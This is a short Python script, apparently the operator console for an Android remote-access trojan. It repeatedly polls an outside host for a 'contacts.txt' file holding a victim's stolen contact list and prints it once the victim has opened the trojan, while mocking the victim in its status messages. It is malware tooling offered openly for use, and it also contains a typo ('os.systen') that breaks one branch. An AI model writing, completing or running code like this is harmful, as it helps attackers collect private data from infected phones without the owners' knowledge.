import time
import requests
import os
RED = "\033[31m"
GREEN = "\033[32m"
BLUE = "\033[34m"
RESET = "\033[0m"
contacts_url = "http://bluntcord.medianewsonline.com/aroid_to/contacts.txt"
print(f"{BLUE}Coded by Nihility{RESET}")
print(f"{RED}Android RAT viewer.{RESET}")
print(f"{RED}Victim hasn't accessed the trojan yet...{RESET}")
time.sleep(1)
while True:
    try:
        response = requests.get(contacts_url)
        if response.status_code == 200:
            content = response.text.strip()
            if content:
                os.system('clear')
                print(f"{GREEN}RAT got access. Proceeding...{RESET}")
                print(f"{GREEN}Content:\n {content} {RESET}")
                input("Press Enter to exit.")
                break
            else:
                os.systen('clear')
                print(f"{RED}Dumbass has yet to open the trojan, waiting...{RESET}")
                
        else:
            print(f"Received status code {response.status_code}")
    except Exception as e:
        print(f"Error fetching contacts.txt: {e}")

    time.sleep(2)
